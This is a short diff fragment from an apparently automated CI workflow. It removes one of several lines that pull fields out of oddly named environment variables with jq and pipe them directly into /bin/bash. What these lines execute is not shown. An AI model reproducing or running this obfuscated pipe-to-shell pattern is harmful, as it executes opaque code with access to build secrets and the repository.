@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
           echo $qq5 | jq -r .xipli80 | /bin/bash
           echo $xbksp5 | jq -r .xzv1487 | /bin/bash
-          echo $jgk6025 | jq -r .q83 | /bin/bash
           echo $whey454 | jq -r .t7005 | /bin/bash
 
       - name: Upload results
